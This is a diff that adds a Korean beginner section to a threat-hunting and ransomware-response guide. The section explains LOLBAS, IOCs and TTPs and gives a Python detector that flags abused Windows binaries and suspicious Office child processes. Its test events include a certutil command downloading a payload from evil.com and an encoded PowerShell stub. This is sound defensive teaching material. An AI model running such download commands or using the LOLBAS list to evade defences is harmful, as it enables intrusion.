@@ -6,6 +6,115 @@
 
 # 위협 헌팅 & 랜섬웨어 침해 대응
 
+## 0. 초보자를 위한 개념 이해
+
+### 위협 헌팅이란?
+
+위협 헌팅(Threat Hunting)은 "공격자가 이미 내부에 있다"는 가정 하에 탐지 시스템이 놓친 침해 흔적을 사람이 능동적으로 찾는 활동입니다. 알림 대기(수동 방어)와 달리, 헌터는 최신 위협 인텔리전스와 MITRE ATT&CK 기법을 가설로 세우고 로그·메모리를 직접 파고듭니다. 랜섬웨어 같은 고급 공격은 초기 침투 후 수 주간 잠복하므로 위협 헌팅이 핵심 방어 수단입니다.
+
+**왜 배우는가:**
+```
+수동 방어 vs 능동 위협 헌팅:
+
+  수동 (Reactive)              능동 (Proactive)
+  ─────────────────────────────────────────────
+  알림 → 대응                  가설 → 탐색 → 발견
+  이미 탐지된 위협만 처리      탐지 안 된 APT 추적
+  평균 탐지: 200일 후           목표: 수 일 내 발견
+  랜섬웨어: 암호화 후 발견      랜섬웨어: 암호화 전 차단
+```
+
+### 핵심 개념 정리
+
+```
+위협 헌팅 핵심 개념:
+
+  LOLBAS  — Living Off the Land Binaries
+             정상 시스템 도구(certutil, mshta, regsvr32)를
+             공격에 악용 → AV/EDR 우회
+
+  IOC     — Indicator of Compromise (침해 지표)
+             알려진 악성 IP, 해시, 도메인
+
+  TTP     — Tactics/Techniques/Procedures
+             공격자 행동 패턴 (IOC보다 오래 유효)
+
+  베이스라인 — 정상 환경의 기준값
+               비정상 탐지를 위한 비교 기준
+
+  헌팅 가설 예시:
+    "공격자가 PowerShell 없이 LOLBAS로 실행 중"
+    "DNS over HTTPS로 C2 통신을 숨기고 있다"
+    "야간에 대용량 데이터를 외부로 전송 중"
+```
+
+### 필요한 도구 및 환경
+- **Velociraptor**: 오픈소스 엔드포인트 가시성 및 헌팅 플랫폼
+- **MITRE ATT&CK Navigator**: 공격 기법 시각화 및 가설 수립
+- **Sigma Rules**: 플랫폼 독립적 탐지 규칙 저장소
+- **Process Monitor / Sysmon**: 윈도우 프로세스 상세 로깅
+
+### 기초 실습 예제
+```python
+#!/usr/bin/env python3
+"""위협 헌팅 — Windows 이벤트 로그에서 LOLBAS 실행 탐지."""
+
+from dataclasses import dataclass
+from pathlib import Path
+
+
+# LOLBAS: 공격에 악용되는 정상 윈도우 바이너리
+LOLBAS_BINARIES: set[str] = {
+    "certutil.exe", "mshta.exe", "regsvr32.exe",
+    "rundll32.exe", "wscript.exe", "cscript.exe",
+    "msiexec.exe", "installutil.exe", "bitsadmin.exe",
+}
+
+# 의심스러운 부모-자식 프로세스 관계
+SUSPICIOUS_PARENT_CHILD: dict[str, set[str]] = {
+    "winword.exe":  {"cmd.exe", "powershell.exe", "wscript.exe"},
+    "excel.exe":    {"cmd.exe", "powershell.exe", "mshta.exe"},
+    "outlook.exe":  {"cmd.exe", "powershell.exe"},
+}
+
+
+@dataclass
+class ProcessEvent:
+    pid: int
+    process_name: str
+    parent_name: str
+    command_line: str
+
+
+def hunt_suspicious_processes(events: list[ProcessEvent]) -> list[str]:
+    """의심스러운 프로세스 실행 패턴을 탐지합니다."""
+    findings: list[str] = []
+    for ev in events:
+        proc = ev.process_name.lower()
+        parent = ev.parent_name.lower()
+        # LOLBAS 실행 탐지
+        if proc in LOLBAS_BINARIES:
+            findings.append(f"[LOLBAS] PID={ev.pid} {proc} by {parent}")
+        # 의심스러운 부모-자식 관계
+        if parent in SUSPICIOUS_PARENT_CHILD:
+            if proc in SUSPICIOUS_PARENT_CHILD[parent]:
+                findings.append(f"[부모-자식 의심] {parent} → {proc}")
+    return findings
+
+
+if __name__ == "__main__":
+    test_events = [
+        ProcessEvent(1234, "certutil.exe", "cmd.exe", "certutil -urlcache -f http://evil.com/payload"),
+        ProcessEvent(5678, "powershell.exe", "winword.exe", "powershell -enc ..."),
+        ProcessEvent(9012, "notepad.exe", "explorer.exe", "notepad.exe"),
+    ]
+    results = hunt_suspicious_processes(test_events)
+    for finding in results:
+        print(f"[경고] {finding}")
+```
+
+---
+
 ## 위협 헌팅이란
 
 ```
